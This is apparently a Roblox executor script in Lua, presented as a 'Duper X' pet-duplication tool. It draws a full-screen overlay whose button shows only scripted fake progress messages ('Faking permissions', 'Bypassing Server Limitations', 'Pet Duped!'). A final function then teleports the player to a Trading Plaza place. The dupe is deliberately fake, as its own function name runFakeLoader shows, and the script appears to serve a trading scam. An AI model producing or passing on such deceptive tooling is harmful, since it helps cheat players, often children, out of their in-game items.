getgenv().Enabled = false

local Loader = Instance.new("ScreenGui")
local BG = Instance.new("Frame")

Loader.Name = "Loader"
Loader.ResetOnSpawn = false
Loader.IgnoreGuiInset = true
Loader.ZIndexBehavior = Enum.ZIndexBehavior.Global
Loader.Parent = game:GetService("CoreGui")

BG.Name = "BG"
BG.Parent = Loader
BG.BackgroundColor3 = Color3.fromRGB(57, 56, 56)
BG.BorderColor3 = Color3.fromRGB(0, 0, 0)
BG.BorderSizePixel = 0
BG.Size = UDim2.new(1, 0, 1, 0)
BG.ZIndex = 99999

function runFakeLoader ()
	local Loader_2 = Instance.new("Frame")
	local UICorner_3 = Instance.new("UICorner")
	local Title_2 = Instance.new("TextLabel")
	local Loading = Instance.new("TextLabel")
	
	Loader_2.Name = "Loader"
	Loader_2.Parent = BG
	Loader_2.AnchorPoint = Vector2.new(0.5, 0.5)
	Loader_2.BackgroundColor3 = Color3.fromRGB(113, 113, 113)
	Loader_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Loader_2.BorderSizePixel = 0
	Loader_2.Position = UDim2.new(0.5, 0, 0.5, 0)
	Loader_2.Size = UDim2.new(0, 500, 0, 300)
	Loader_2.ZIndex = 100000

	UICorner_3.CornerRadius = UDim.new(0, 16)
	UICorner_3.Parent = Loader_2

	Title_2.Name = "Title"
	Title_2.Parent = Loader_2
	Title_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title_2.BackgroundTransparency = 1.000
	Title_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Title_2.BorderSizePixel = 0
	Title_2.Size = UDim2.new(1, 0, 0, 25)
	Title_2.ZIndex = 110000
	Title_2.Font = Enum.Font.Highway
	Title_2.Text = "Duper X"
	Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title_2.TextScaled = true
	Title_2.TextSize = 14.000
	Title_2.TextWrapped = true

	Loading.Name = "Loading"
	Loading.Parent = Loader_2
	Loading.AnchorPoint = Vector2.new(0.5, 0.5)
	Loading.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Loading.BackgroundTransparency = 1.000
	Loading.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Loading.BorderSizePixel = 0
	Loading.Position = UDim2.new(0.5, 0, 0.5, 0)
	Loading.Size = UDim2.new(1, 0, 0, 40)
	Loading.ZIndex = 110000
	Loading.Font = Enum.Font.Highway
	Loading.Text = "Loading Env"
	Loading.TextColor3 = Color3.fromRGB(255, 255, 255)
	Loading.TextScaled = true
	Loading.TextSize = 14.000
	Loading.TextWrapped = true
    
    return function ()
        Loader_2.Visible = false
    end
end

function createActionWindow ()
	local Action = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local Title = Instance.new("TextLabel")
	local Dupe = Instance.new("TextButton")
	local UICorner_2 = Instance.new("UICorner")
	
	Action.Name = "Action"
	Action.Parent = BG
	Action.AnchorPoint = Vector2.new(0.5, 0.5)
	Action.BackgroundColor3 = Color3.fromRGB(113, 113, 113)
	Action.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Action.BorderSizePixel = 0
	Action.Position = UDim2.new(0.5, 0, 0.5, 0)
	Action.Size = UDim2.new(0, 500, 0, 300)
	Action.ZIndex = 100000
	
	UICorner.CornerRadius = UDim.new(0, 16)
	UICorner.Parent = Action

	Title.Name = "Title"
	Title.Parent = Action
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Title.BorderSizePixel = 0
	Title.Size = UDim2.new(1, 0, 0, 25)
	Title.ZIndex = 110000
	Title.Font = Enum.Font.Highway
	Title.Text = "Duper X"
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.TextScaled = true
	Title.TextSize = 14.000
	Title.TextWrapped = true

	Dupe.Name = "Dupe"
	Dupe.Parent = Action
	Dupe.AnchorPoint = Vector2.new(0.5, 0.5)
	Dupe.BackgroundColor3 = Color3.fromRGB(144, 144, 144)
	Dupe.BorderColor3 = Color3.fromRGB(0, 0, 0)
	Dupe.BorderSizePixel = 0
	Dupe.Position = UDim2.new(0.5, 0, 0.5, 0)
	Dupe.Size = UDim2.new(0, 250, 0, 50)
	Dupe.ZIndex = 110000
	Dupe.Font = Enum.Font.Highway
	Dupe.Text = "Dupe all RAP Pets"
	Dupe.TextColor3 = Color3.fromRGB(255, 255, 255)
	Dupe.TextScaled = true
	Dupe.TextSize = 14.000
	Dupe.TextWrapped = true

	UICorner_2.CornerRadius = UDim.new(0, 16)
	UICorner_2.Parent = Dupe

    return Dupe
end

local remove = runFakeLoader()

wait(5)
remove()
local button = createActionWindow()
getgenv().Enabled = false
local randomExpressionTable = {
    "Sending Admin CMD",
    "Waiting for server secret",
    "Server Secret Received",
    "Sending Award Pet CMD",
    "Changing Pet Info for undetection",
    "Pet Duped!"
}
button.MouseButton1Click:Connect(function ()
    if not getgenv().Enabled then
        getgenv().Enabled = true
        button.Text = "Hooking all necessary functions"
        wait(3)
        button.Text = "Preparing enviroment for Dupe X execution"
        wait(2)
        button.Text = "Faking permissions"
        wait(3)
        button.Text = "Bypassing Server Limitations"
        wait(5)
        button.Text = "Executing dupe glitch"
        for i = 1, 10, 1 do
            wait(0.5)
            for _, text in pairs(randomExpressionTable) do
                wait(0.05)
                button.Text = text
            end
        end
    end
end)

return function ()
    button.Text = "Sending Trading Plaza request to apply dupe. Hold on"
    game:GetService("TeleportService"):Teleport(15502339080, game.Players.LocalPlayer)
end
